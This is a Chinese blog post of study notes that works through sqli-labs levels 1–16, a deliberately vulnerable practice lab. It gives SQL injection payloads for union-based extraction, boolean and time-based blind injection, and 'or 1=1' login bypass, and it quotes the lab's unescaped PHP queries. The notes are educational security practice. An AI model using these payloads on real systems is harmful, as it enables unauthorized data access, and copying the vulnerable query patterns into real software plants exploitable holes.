title: sqli-labs学习笔记
date: '2019-03-10 19:58:14'
updated: '2019-11-29 16:34:53'
tags: [CTF, SQL注入]
permalink: /articles/2019/03/10/1575014358558.html
---
![](https://img.hacpai.com/bing/20190207.jpg?imageView2/1/w/960/h/540/interlace/1/q/100) 

![](https://img.hacpai.com/bing/20190122.jpg?imageView2/1/w/960/h/540/interlace/1/q/100) 

上次做校赛的题目中觉得自己还是对SQL注入不了解,所以打算好好练练手

<!-- more -->

# Sqli-labs天书卷

[sqli-labs下载地址](https://github.com/Audi-1/sqli-labs)

## Less-1

打开界面要求输入要查询的id。
然后我们输入``?id=1' --+``存在字符注入。
``?id=1' order by n --+``查看回显的字段数,查到有3个字段但是第一个字段不显示。
``?id=1' and 1=2 union select 1,database(),3 --+`` 爆出数据库名为 ``security``。
``?id=1' and 1=2 union select 1,table_name,3 from information.schema.tables where table_schema=0x7365637572697479 limit 0,1 %23`` 爆出表名,通过改变limit的参数来查看表名.

## Less-2

输入``?id=1 and 1=1`` 存在数字型注入
剩下的操作跟第一题类似......

## Less-3

尝试输入``?id=1' ``
出现报错``the right syntax to use near ''1'') LIMIT 0,1' at line 1``推断出可能是``'``和``)``进行闭合
然后输入``?id=1') and 1=2 --+``注入成功

## Less-4

输出``?id=1'`` 并没有任何反应, 继续尝试``?id=1')``,发现也不对
怀疑可能采用双引号闭合(其实看到了题目描述 嘻嘻嘻)
然后输入``?id=1" ``得到报错 ``to use near '"1"") LIMIT 0,1' at line 1``推断出使用``"``和``)``闭合的
输入``id=1") and 1=2 --+``成功注入

## Less-5

输入``?id=1'``出现报错``use near ''1'' LIMIT 0,1' at line 1``所以应该是单引号闭合
输入``?id=1' and 1=1 --+``
{% asset_img 1.png %}
输入``?id=1' and 1=2 --+``时**you are ...**消失所以应该是 ``bool注入``


下列是 ``bool注入`` 的常用函数

```
length（）函数 返回字符串的长度
substr（）截取字符串
ascii（）返回字符的ascii码
sleep(n)：将程序挂起一段时间 n为n秒
if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
```

## Less-6

这道题和上道题相似,只是闭合的符号是``"``.
payload: ``?id=1" --+`` 依然是bool注入

## Less-7

这道题查看源代码

``` PHP
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
```

绕过闭合的方式就有了两种

- ``?id=1')) %23``
- ``?id=1' or '1'='1 %23`` (SQL万能公式,哈哈哈)

然后就是进行bool注入
这道题除了进行bool注入,还可以利用SQL语句``select ... into outfile ...``对服务器写入文件,但是它涉及权限问题并且还要知道MySQL配置文件中``secure_file_priv``的文件写入路径。

ps:一开始用``#``导致上面的语句无法正确执行,换成``%23``却正确。 233333333

## Less-8

输入``?id=1'``没有任何反应
输入``?id=1' and 1=1``出现``you are in ....``的关键字判断应该是bool注入
使用``?id=1' or '1'='1 %23``绕过闭合

## Less-9

输入``?id=1`` ``?id=1'``没有反应,
尝试输入``id=1' and sleep(5)``发现网页请求时间多了五秒,所以确定存在时间盲注

## Less-10

输入``?id' and sleep(5) %23``延迟时间没有执行,猜测可能是闭合绕过姿势不对
输入``?id=1" and sleep(5) %23``网站延迟访问,存在时间盲注

## Less-11

查看源代码

``` php
$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

其中``$uname``和``$passwd``并没有进行过滤,所以可以利用``or '1'='1``永真式绕过password的检测
输入``Username``为``admin' or '1'='1``
发现登录成功

## Less-12

``Username``输入为``admin" or 1=1 --+``时报错
**the right syntax to use near '") and password=("") LIMIT 0,1' at line 1**
所以利用``")``绕过闭合

## Less-13

查看源代码发现是用``('')``闭合变量
构造payload:
``Username: admin') or 1=1 #``

## Less-14

输入``admin' or 1=1 #``没有变化,可能是双引号闭合
构造payload:
``Username: admin" or 1=1 #``

## Less-15

输入``admin' or 1=1 #``没有任何回显,尝试其他方式也没效果
查看源代码发现注入成功后显示``flag.jpg``,我佛了,23333333

## Less-16

查看源代码以为是用``)``闭合,但是几经尝试发现注入一直错误,然后仔细查看源代码发现

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"';
```

构造payload:
``admin") or 1=1#``注入成功
